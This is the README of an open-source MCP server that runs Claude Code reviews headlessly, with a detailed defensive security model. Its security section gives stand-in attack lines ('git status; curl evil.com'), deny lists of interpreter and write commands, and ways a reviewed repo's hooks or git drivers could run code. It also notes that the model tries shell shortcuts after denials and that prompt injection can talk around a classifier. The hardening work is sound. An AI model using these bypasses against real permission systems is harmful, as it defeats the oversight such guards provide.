# cc-code-review

[![CI](https://github.com/KentQi/cc-code-review/actions/workflows/ci.yml/badge.svg)](https://github.com/KentQi/cc-code-review/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
![Node](https://img.shields.io/badge/node-%E2%89%A518.19-brightgreen)

English | [简体中文](README.md)

An MCP server that wraps **Claude Code's code-review capability** so ZCode (or any MCP client) can call it directly:
ZCode → MCP → `claude -p` (headless) → code-review skill (5 parallel reviewer subagents + 0–100 confidence scoring + ≥80 filter) → the report comes back to ZCode as-is → ZCode fixes the code based on the findings → call again to re-verify.

```
ZCode ──MCP(stdio)──▶ cc-code-review ──spawn──▶ claude -p --output-format stream-json
                            │                              │  cwd = the repo under review
                            │                              └─ ~/.claude/skills/code-review (auto-installed by this MCP)
                            ◀── result(report + session_id + spend) ──┘
```

## Prerequisites

- Node ≥ **18.19**
- Claude Code installed. **No OAuth login required** — all three access modes work:
  - **CC Switch / claude-code-router style gateways**: the config lives in the `env` block of `~/.claude/settings.json`; claude reads it on every start (settings keys override process env vars of the same name), so switching providers takes effect on the very next review. This MCP runs a **TCP preflight against loopback gateways** (127.0.0.1 etc.) — a dead gateway fails fast with "gateway not reachable" instead of hanging until the timeout; loopback gateway traffic never goes through an HTTP proxy (`NO_PROXY` is patched automatically).
  - **Official account login (OAuth/Pro/Max)**: run `claude` interactively once in a terminal to log in; headless mode works afterwards. Note: if the MCP host runs as a service/scheduled task that cannot read your credential store (Windows Credential Manager / macOS Keychain), you will get "Not logged in".
  - **`ANTHROPIC_API_KEY` environment variable**: inherited from the host environment, works as-is.
- PR-scope reviews need `gh` logged in; local diff reviews (working-dir / branch / last-commit) only need git.

## Cross-platform & installation forms

The `claude` executable is resolved with the following priority (`claude_review_env` shows which source hit):

| Priority | Source | Windows path | macOS path |
|---|---|---|---|
| 1 | `CLAUDE_CODE_PATH` env var | any executable or cli.js (`.cmd`/`.bat`/`.ps1` shims rejected) | same |
| 2 | PATH scan | `claude.exe` | `claude` (executable) |
| 3 | Well-known locations | `%USERPROFILE%\.local\bin\claude.exe` (native installer), winget Links, exe inside the npm default prefix | `~/.local/bin/claude` (native), `/opt/homebrew/bin/claude`, `/usr/local/bin/claude`, `~/.claude/local/claude` |
| 4 | npm global root (honors a custom prefix) | `<npm root -g>/@anthropic-ai/claude-code/bin/claude.exe` or `cli.js` | same |
| 5 | Claude desktop app's bundled CLI (last resort, unofficial entry) | `%APPDATA%\Claude\claude-code\<version>\claude.exe` | `~/Library/Application Support/Claude/claude-code/<version>/claude.app/Contents/MacOS/claude` |

Notes:

- No `where`/`which` subprocesses are used (on zh-CN Windows their GBK output decodes to mojibake); the PATH is scanned directory by directory with plain Node `fs` calls.
- **Desktop app installed but no CLI also works**: it falls back to the app's versioned embedded CLI (newest version directory; the path may drift after an app update, so installing a standalone CLI is recommended for serious use).
- macOS: if the host is launched from Dock/Finder, it inherits launchd's sparse PATH; this MCP automatically **appends** `/opt/homebrew/bin`, `/usr/local/bin`, `~/.local/bin` and friends to the claude child's PATH (the npm shim's `#!/usr/bin/env node` and claude's internal git/gh depend on it; appending — never prepending — keeps the user's own PATH priority). Likewise, put node's **absolute path** in ZCode's MCP `command`.
- macOS: if a freshly installed native binary is Gatekeeper-killed (SIGKILL) on its first headless run, the error message tells you to run `claude --version` once in a terminal first.
- Timeout/cancellation kills the whole process tree (Windows `taskkill /T /F`, Unix process-group SIGKILL); surviving children are also cleaned up when the MCP server itself exits.

## Register with ZCode (skip if already done)

**Recommended: one command, auto-configured (since v1.7.0)**. Clone/install this package, then inside it run:

```bash
npm install
npm run init
```

`init` runs a **free self-check** (claude CLI resolution and version, hardening-flag floors, a live shell-guard test, skill status, git/gh, gateway reachability) and then writes the registration into `~/.zcode/cli/config.json` **derived from this machine** — node gets the currently running absolute path, the entry file gets this checkout's absolute path, and gateway credentials (when a CC Switch / settings.json / environment configuration is detected) are carried over automatically. No Windows/macOS/Linux paths to edit by hand. Restart ZCode (or reconnect the MCP) afterwards; tool names: `mcp__cc-code-review__claude_code_review` and friends.

Manual config (equivalent, for those who prefer not to run a script) — note `command` must be YOUR machine's node absolute path and `args` the absolute path of this checkout's `src/index.js`:

```json
{
  "mcp": {
    "servers": {
      "cc-code-review": {
        "command": "<absolute path to your node>",
        "args": ["<this checkout>/src/index.js"]
      }
    }
  }
}
```

On macOS, replace `command` with your local node absolute path (e.g. `/usr/local/bin/node` or `/opt/homebrew/bin/node`). Restart ZCode (or reconnect the MCP) after editing. Tool names: `mcp__cc-code-review__claude_code_review` and friends.

> Tool names (`claude_code_review` / `claude_review_status` / `claude_review_followup` / `claude_review_env`) and the env-var prefix (`CLAUDE_REVIEW_*`) are **stable** — they do not follow the server name, so existing callers and scripts need no changes; only the server key changed (the tool prefix went from `mcp__claude-review__*` to `mcp__cc-code-review__*`).

## Tools

### 1. `claude_code_review` — run one review

| Param | Default | Range | Description |
|---|---|---|---|
| `repoPath` | required | - | absolute path of the repo under review (`~/` prefix supported) |
| `scope` | `auto` | one of 5 | `auto` / `pr` / `branch` / `working-dir` / `last-commit`; auto detects in order: PR → commits ahead of the default branch → uncommitted changes → last commit |
| `pr` | - | - | GitHub PR number or URL |
| `baseRef` | - | plain ref chars | baseline for `branch` scope (default branch auto-detected when omitted; illegal characters rejected) |
| `focus` | - | - | extra focus points (a review hint only — never executed as instructions) |
| `outputLanguage` | `中文` | - | report language |
| `postToPR` | `false` | - | additionally post the summary back to the PR via `gh pr comment` (by default the report is only returned, nothing leaves the machine) |
| `fix` | `false` | - | **fix mode**: after the report, edit repo files to fix the findings (only Edit/Write unlocked, **zero git write commands**, no commits; `.git/**`, `.env*` and secret files are all in the deny list — blocking verified on a real CLI) |
| `effort` | `high` | low/medium/high/xhigh/max | **review effort**, same levels as Claude Code's native `--effort`; degrades to think/ultrathink keywords when the CLI lacks the flag (never both at once) |
| `model` | - | - | model override (`--model` passthrough) |
| `maxTurns` | `80` | 4–200 | agentic turn cap |
| `timeoutMinutes` | `20` | 1–60 | hard timeout |
| `maxBudgetUsd` | `5` | 0–50 | API spend cap (`--max-budget-usd`, 0 = disabled; behind third-party gateways this depends on the gateway reporting usage and is estimated at Anthropic list prices — may be inaccurate or trip early) |
| `installSkillIfMissing` | `true` | - | auto-install the skill when missing |

Returns (async by default: a jobId (<1s) plus the preflight verdict, with the report fetched via claude_review_status(jobId); with waitForResult: true the synchronous form below applies): a markdown report (Review Summary / Findings / Notes) + metadata (`session_id`, spend, turns, log path). Auth/gateway failures from claude come back as a prominent `⚠️ REVIEW FAILED` banner with actionable hints — never disguised as a "report".

### 2. `claude_review_status` — poll / fetch / cancel a background review (free)

`claude_code_review` is **async by default**: after all free preflight checks pass it returns a jobId in under a second — real reviews take 2-15 minutes and most MCP clients cut tool calls at ~30s. This tool: with jobId, poll (reports elapsed time) or fetch the finished report; with jobId + cancel=true, abort and stop billing; without arguments, list this process's jobs. Clients that want the synchronous contract pass waitForResult: true to claude_code_review.

### 3. `claude_review_followup` — follow-up questions / re-review

Continue the conversation using the `session_id` returned by the previous run (`claude --resume`).

### 4. `claude_review_env` — environment self-check (free)

CLI resolution result and its source, version, `--effort`/`--max-budget-usd` support, skill status, gateway reachability (loopback TCP preflight), leftover auth-variable warnings, `git`/`gh` availability, `CLAUDE_CODE_EFFORT_LEVEL` override warnings. The first line is a machine-readable `verdict: OK|NOT_FOUND|MISCONFIGURED`. `installSkill: true` manually (re)installs the skill.

## About the bundled code-review skill

- When `~/.claude/skills/code-review` does not exist, the first call auto-installs the bundled version (adapted from Anthropic's official code-review pipeline), marked `installed-by-cc-code-review`. The legacy `installed-by-claude-review-mcp` marker is still recognized as "installed by this MCP" and is migrated to the new marker on the next install, so an existing install will not be misjudged as your own skill.
- If you already keep your own skill in that directory, it is **used as-is and never overwritten**.
- To opt out of auto-install: `installSkillIfMissing: false` or `CLAUDE_REVIEW_AUTO_INSTALL_SKILL=0` — it degrades to a built-in minimal review prompt.

## Security model (after multiple independent audits)

**Process boundary (added v1.3.0, verified in real runs)**

- `--setting-sources user`: the repo under review may ship its own `.claude/settings.json` (project/local scope). Loading it would execute repo-controlled SessionStart hooks (arbitrary code execution) and could override `ANTHROPIC_*` (credential exfiltration). This MCP loads only user-level settings. Verified with a controlled experiment: with a malicious `settings.json` in the repo and no flag, the hook really executed and the API connection was hijacked; with the flag, both disappeared.
- `--permission-mode manual` + `--permission-prompts none`: the allowlist becomes a **hard boundary** — calls outside the list are denied outright instead of being judged by the (model-driven) permission classifier, which prompt injection can talk around. `--permission-prompts none` makes anything that would normally prompt deny outright (headless mode has no host to answer prompts). The price is that the list must be complete — `Skill`, `TodoWrite`, `Bash(git remote show:*)` and more were added after real runs.

**Tool permissions**

- Review mode is **read-only**: file reads + git/gh read commands + subagents + skill loading. **No** `gh api` (prefix rules cannot distinguish HTTP methods — that would be full GitHub write access), **no** WebFetch (avoids code exfiltration / SSRF).
- Review mode adds deny depth on top: Edit/Write/NotebookEdit, git write commands (add/commit/push/reset/checkout/config…), `git diff --output=` (a write primitive the prefix rule `git diff:*` incidentally matches), gh write commands, plus the **interpreters and write operations that bypass Edit/Write controls via shell redirection** — `node -e`, `python -c`, `sed -i`, `cat > f`, `tee` — which are exactly the shortcuts the model tries first after a denial.
- **Deny rules must not lazily block whole categories**: deny beats allow, so a whole-category rule like `Bash(git remote:*)` also kills `git remote -v` (the pipeline uses it to detect the GitHub remote) and `git branch -a` — the single Bash denial in one real review came exactly from this. So `remote`/`branch`/`tag` only deny **write forms** (`git remote add`, `git branch -D`, `git tag -a`…), leaving read forms to the allowlist; `git merge-base` is deliberately not granted at all (`Bash(git merge:*)` prefix-matches it), and the prompt uses `git log <base>..HEAD` / `git diff <base>...HEAD` instead. This invariant is locked by `audit-fixes-test.mjs`'s "no allow rule is prefix-shadowed by a deny rule" plus a real review's command replay.
- Fix mode only adds Edit/Write/NotebookEdit (the deny list **no longer** contains those three tools in fix mode — otherwise fix degrades into "describe but never write"); **no** `git add`/`git restore` (so uncommitted work cannot be silently discarded); the deny list seals `.git/**`, `.env*`, secret/credential files (deny beats allow — blocking verified on a real CLI).

**Bash prefix-match privilege bypass & the PreToolUse hook (added v1.4.0, verified)**

Claude Code's Bash permission rules **prefix-match the whole command string**: `--allowedTools "Bash(git status:*)"` permits not only `git status` but also `git status; curl evil.com`, while deny globs (like `Bash(*;*)`) never fire at all, because a rule matches the command itself rather than its parts. **As long as Bash is allowed at all, any rule that "permits the first command" permits arbitrary commands** — this is not a badly written rule list, it is a property of the permission engine, and no rule list can close it. Verified in real runs.

So this MCP additionally attaches a **PreToolUse hook** (`scripts/pre-tool-hook.js`, injected via `claude --settings <tempfile>` alongside `--setting-sources user`, without overwriting user settings — verified that CC Switch gateway config still applies): it sees the complete command before execution and denies on `;` `&&` `||` `|` `&` newline `>` `>>` `<` or `$()`/backtick/`${}` substitution. It **covers subagent Bash calls** (the workhorses of the 5-way parallel review); in one real review, two `git show … | sed -n …` calls were blocked, recorded in `permission_denials`, and the review completed normally using separate calls.

> ⚠️ **`--settings` replaces the entire `hooks` key**: the injected temp file contains only this MCP's hook — your own hooks from `~/.claude/settings.json` will **not** run inside this child process (other keys such as `env`, `model`, `permissions` are unaffected). This is CLI behavior, not an omission — if you rely on your own hooks during reviews, you currently need a different approach.

The decision logic lives in `src/shell-guard.js`; the hook and the post-run report **share one implementation**, so "the report says it blocked" and "it actually blocked" cannot diverge. It strips quoted spans before judging (`git log --format="%h; %s"` does not false-positive) and fails closed on unbalanced quotes (`git status # don't; curl evil.com` cannot hide a payload in a comment). The contract is locked by `scripts/shell-guard-test.mjs` (67 checks, including a real 5-subagent review's command replay) — **run `npm test` before touching that regex**. Turn it off with `CLAUDE_REVIEW_SHELL_GUARD=0` (the whole thing then fails closed and refuses to run — see "Fail closed when a defense layer is missing").

Redirects (`>`, `<`, `2>/dev/null`) are deliberately denied exactly like chaining: everyday forms such as `cmd 2>/dev/null` or `sort < file` are blocked — split the call or use the dedicated tools. That is a defense-over-convenience design choice, not a false positive.

The hook has a second deterministic rule: **git's `--output=` / `--output-directory=` turns "read-only" commands into file writers** (`git diff/show/log --output=<file>` and `git format-patch --output-directory=` all write to disk — verified; `--output-to=` is not a real flag). Deny globs are powerless here — Bash rules prefix-match the whole command, so `Bash(git diff --output=*)` cannot catch `git diff HEAD --output=x`, and the semantics of a mid-rule `*` cannot be verified from outside the CLI — so the hook judges this one directly. Non-git `--output` flags (grep, `find -print`, …) are unaffected.

**Write-surface confinement (the hook's other half, v1.5.0)**

Edit / Write / NotebookEdit / Read are hooked too and bounded by `CLAUDE_REVIEW_REPO_ROOT`: the target path must resolve inside the repo under review; `.git/**`, `.env*`, `id_rsa*`/`*.pem`/`*.key` and other secret paths are always denied; without a `repoRoot` (the hook config did not apply) everything fails closed instead of passing through. The boundary check goes through **realpath** (both sides resolved to their on-disk real paths), so in-repo directory junctions/symlinks (`repo/link -> ~/.ssh` — lexically inside, physically outside) are blocked as well (locked by regression tests); writes to not-yet-existing targets are anchored on their nearest existing ancestor.

**The repo as a code-execution surface (added v1.5.0; liveness-aware since v1.7.0)**

git executes the **repository's own** configuration: `core.fsmonitor`, `diff.<driver>.command`, `.gitattributes` filter/textconv drivers, `core.hooksPath`, `[include] path = ../x` (which can point outside the repo). `-c` overrides can only neutralize known keys, and driver names are arbitrary. So every run first scans `.git/config` (including the include chain) and every `.gitattributes`: **discovering repo-controlled program execution refuses the run outright** rather than reviewing a compromised tree.

The scan is precise and does not punish normal repos: a `.gitattributes` saying `*.png filter=lfs` with the driver defined in the user's **global** config (the common git-lfs install) does **not** trigger a refusal; `core.fsmonitor = true` (a boolean, already neutralized by `-c`) does **not** either. Since v1.7.0 it further distinguishes **live** from **dead** config:

- **Dead paths downgrade to a note**: a repository copied wholesale from another machine routinely carries the original machine's absolute paths (e.g. `core.hooksPath = /Users/kent/Desktop/...` seen on Windows). A path that does not exist on this machine cannot execute anything — it becomes a note in the report instead of blocking the review (locked by regression tests).
- **`core.hooksPath` is a note even when live**: git hooks fire only on **mutating** operations (commit/merge/rebase/...), none of which the review allowlist ever grants, and this server's own git calls always neutralize the key via `-c core.hooksPath=`. fsmonitor/textconv/external/filter drivers are different — they fire on **read** commands like `git status`/`git diff` — so a live one still refuses and a dead one proceeds with a note.

**Fail closed when a defense layer is missing**

When the hook is not installed, when `guardSelfTest()` fails (the hook must really deny a chained command and really allow a clean one), or when the guard state is `failed`, both tools **refuse to start a review** and say which layer is missing — because manual mode's allowlist alone cannot stop the prefix-match bypass. Only setting `CLAUDE_REVIEW_ALLOW_UNGUARDED=1` explicitly unlocks an unguarded run (e.g. for debugging false positives).

**Version floors (added v1.5.0)**

`--permission-mode manual` needs CLI ≥ 2.1.200; `--permission-prompts none` needs ≥ 2.1.259. Passing an unknown flag to an older claude ends the whole run with one cryptic error, so each flag is gated by a `claude --version` read before the run (the version comparison is safe for pre-releases like `2.1.301-beta.1`); below the floor the flag is skipped and the result says so. `claude_review_env` prints both floors and the current CLI version.

**Input validation (added v1.3.0 — all before any paid call)**

| Input | Rule | Reason |
|---|---|---|
| `repoPath` | must be absolute (`~/` is expanded) | a relative path resolves against the MCP server's own cwd — it could review the wrong repo and spend money |
| `repoPath` | must be a git/hg/svn repo | every scope reads git history; a non-repo buys one guaranteed-to-fail paid call |
| empty repo | no commits and no uncommitted changes → refused | nothing to review |
| `pr` | only `123` / `#123` / `owner/repo#123` / a GitHub PR URL | the value is interpolated into the review prompt |
| `outputLanguage` | single line, ≤40 chars, no backticks | same — prevents smuggling instructions |
| `baseRef` | plain ref chars; no leading `-` | interpolated into git commands; a leading `-` becomes a git flag (`git merge-base --output=<file>` writes files), so it is rejected rather than "ignored" |
| `focus` | single line, ≤2000 chars, no control characters | same |

**Cancellation semantics**: the MCP SDK **deliberately drops the response to a cancelled request** (per protocol — the client already knows it cancelled). So you will not see a "cancelled" return value, but the child process tree is taskkilled within ~2 seconds of cancellation and billing stops immediately; the same applies when the client closes stdio while a review runs.

**Observability (added v1.3.0)**: the result metadata carries `permission_denials` and `reviewer_subagents_spawned`. Under manual mode, a missing allowlist entry does not abort the run — it silently degrades the review (e.g. the 5 reviewer subagents never start), and these two fields make that degradation visible. Fix mode also compares `git status` before and after; an unchanged working tree is reported as `FIX MODE VERIFICATION FAILED` — a reviewer that "described" a fix without writing it is not misjudged as success.

Since v1.4.0 the metadata also carries `bashCalls` (Bash calls made this run) and `shellGuardBlocked` (chained commands blocked by the hook), and distinguishes two denial kinds: chained commands being blocked is the **hook working as intended** (the model should split them into separate calls — not a review degradation); only other denials report "the review may be incomplete". If you ever see `⚠ SHELL-CHAINED COMMANDS RAN WITHOUT BEING BLOCKED`, a command really executed past the hook — only then treat the repository as a hostile environment.

- Run logs (which quote the code under review) go to `%TEMP%/cc-code-review/`, dir 0700, files 0600, keeping the newest 20. Guard temp files and the throwaway git HOME live in the same directory — cleaned on process exit, stale leftovers swept by the next run.
- The CLI ships a built-in safe-command whitelist (`ls`, `cat`, `echo` and other read-only tools) that passes even outside `--allowedTools`. Verified that `node -e`, `python -c`, `rm`, `git push`, `git commit`, `curl` and Write tool calls are **all denied** — so this is not a privilege hole, but "only the whitelist passes" should be read as "whitelist + this batch of built-in read-only commands".
- The model can split a hook-blocked compound command into several allowed calls — the hook blocks "many steps in one command", not "many things in one turn". The real capability boundary is still manual mode's allowlist; the hook guarantees each step is individually auditable.
- Known residual risk: fix-mode edits to other files in the repo, prompt-injection-induced "plausible-looking" edits — fix mode leaves changes uncommitted in the working tree, so review them with `git diff` as you would a PR before adopting them.
- Known residual risk (Windows): the 0700/0600 dir/file modes are best-effort — NTFS has no POSIX mode bits, so other local users can theoretically read `%TEMP%\cc-code-review\run-*.log` (which quotes the code under review). For stricter isolation, set `CLAUDE_REVIEW_LOG_DIR` to a directory your own ACLs protect, or accept the risk (equivalent to none for most single-user desktops).

## Environment variables

| Variable | Default | Description |
|---|---|---|
| `CLAUDE_CODE_PATH` | auto-detect | claude executable / cli.js (shell shims rejected) |
| `CLAUDE_REVIEW_TIMEOUT_MIN` | `20` | default timeout (minutes) |
| `CLAUDE_REVIEW_MAX_BUDGET_USD` | `5` | default spend cap (0 = disabled) |
| `CLAUDE_REVIEW_MODEL` | - | default model |
| `CLAUDE_REVIEW_AUTO_INSTALL_SKILL` | `1` | whether to auto-install the skill |
| `CLAUDE_REVIEW_SHELL_GUARD` | `1` | `0` disables the PreToolUse chained-command guard (troubleshooting only, not recommended; setting it alone unlocks nothing — the tools also refuse to run) |
| `CLAUDE_REVIEW_ALLOW_UNGUARDED` | - | set `1` to allow runs when the hook did not apply / the self-test failed. Refuses by default |
| `CLAUDE_REVIEW_LOG_DIR` | `%TEMP%/cc-code-review` | run-log directory (logs quote the code under review; Windows has no POSIX mode bits — point it at a directory your own ACLs protect) |

Tip: if the host environment has leftover `ANTHROPIC_API_KEY` and friends that `settings.json` does not manage, they may conflict with CC Switch (`claude_review_env` warns about this); gateway users can add `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"` to `~/.claude/settings.json` to reduce non-essential traffic.

## Cost & duration

- Every real review consumes Claude credits (through your subscription/gateway), typically 2–15 minutes and $0.3–5 depending on diff and effort; `maxBudgetUsd` is the backstop.
- `claude_review_env` and version/flag probes are free (results are cached).

## Using it from ZCode

Restart ZCode and just say, for example:

> Use the cc-code-review MCP to run a code review of the uncommitted changes in C:\path\to\repo (effort max), then fix the findings, then re-review to confirm.

## Testing / maintenance

```bash
npm install
npm test                                         # shell-guard unit tests (67, free) + audit-fix unit tests (165, free) + stdio handshake/env check
npm run init                                     # environment self-check + writes the ZCode registration for THIS machine (free)
node scripts/validation-test.mjs                # every input-validation path (free, no API calls)
node scripts/cross-cases.mjs                    # 10 MECE cases (50 checks; free stub-claude async lifecycle; C9 paid needs CC_LOOP_PAID=1)
node scripts/e2e-test.mjs <repoPath> [json]     # real review (billed)
node scripts/followup-e2e.mjs <repoPath> <sessionId> # real followup (billed)
node scripts/cancel-test.mjs <repoPath>         # is the process tree killed right after cancel (billed, a few cents)
```

`validation-test.mjs` covers: relative `repoPath` refused, malicious `pr` refused, multi-line `outputLanguage` refused, empty repo refused, non-git directory refused, `maxBudgetUsd=0` accepted by the schema, `baseRef` starting with `-` refused, `focus` with control characters / oversized refused, both tools fail-closed when the guard is off, and the explicit `CLAUDE_REVIEW_ALLOW_UNGUARDED=1` unlock. Everything returns before any paid call — the one exception is the "clean repo passes preflight" check, which really starts a budget-capped paid run and is therefore **skipped by default**; set `CC_REVIEW_ALLOW_PAID_PROBE=1` to include it.

`shell-guard-test.mjs` covers: chained/redirected/substituted commands must be blocked, quoted separators like `git log --format="%h; %s"` must pass, unbalanced quotes fail closed, the hook process's stdin→deny contract, the repo boundary and `.git/`/secret-path interception for Edit/Write/Read, in-repo junction/symlink escapes (realpath containment), and a real 5-subagent review's 17-command replay (confirming blocked commands are not misreported as escapes).

`audit-fixes-test.mjs` covers every fix from the independent audit rounds: deny-list coverage and the "same rule in both lists is dead code" conflict, **allow rules prefix-shadowed by deny rules** (`Bash(git remote -v)` vs `Bash(git remote:*)` — found in a real review), `postToPR` grants not being dead code, version comparison (including pre-releases), git hardening `-c` args, `repoRunsGitPrograms` precision (fsmonitor booleans and global LFS drivers do not false-positive; `[include]` chains and `.gitattributes`↔config cross-checks do catch real drivers), the hook's `git --output=` rule, caller data staying data inside prompts, and a real review's command replay (both the allowlist and the deny side must pass).

**Run `npm test` before touching the regex in `src/shell-guard.js`**: the comment on that regex and the module docstring explain why it must include `|` and `&` (the prefix-match bypass) — reading only the code makes it look like false-positive tuning.

**Verified regressions** (Windows / npm global install / CC Switch local gateway, no account login): a full review under manual mode (Chinese report, self-planted bugs scored CRITICAL/MAJOR per the ≥80 rule, low-confidence items correctly demoted to Notes), `scope=branch` + `baseRef` (`git log main..HEAD` / `git diff main...HEAD`, `permission_denials=0`, guard blocked 0), fix mode writes files and does **not** commit, `.git/` untouched, followup resumes the same session via the returned `session_id`. Earlier rounds also verified: a repo carrying a malicious `.claude/settings.json` no longer executes repo-controlled hooks, and the process tree is zeroed within 2 seconds of cancellation.

- Run logs: `%TEMP%\cc-code-review\run-*.log` (newest 20 kept)
- Upgrading from v1.5.0 or earlier (old name claude-review-mcp): the old log directory `%TEMP%\claude-review-mcp` is never touched or deleted by the new version; delete it manually if it contains sensitive references.
- Uninstall: delete the `cc-code-review` entry from the ZCode config; delete `~/.claude/skills/code-review` to remove the skill.

## License & acknowledgments

- This project is open source under the [MIT](LICENSE) license.
- The bundled code-review skill (`assets/skills/code-review/SKILL.md`) is adapted from Anthropic's official code-review plugin pipeline (5-way parallel review + confidence filtering), further adapted here for headless invocation and the read-only boundary.
- Thanks to the Claude Code team and to the CC Switch / claude-code-router gateway projects for making "reviews without an account login" possible.
- The security model has been through multiple rounds of independent cross-audits (Windows / macOS / auth-gateway / install-forms / regression perspectives) — see above and [SECURITY.md](SECURITY.md). Please report vulnerabilities via private advisories, not public issues.
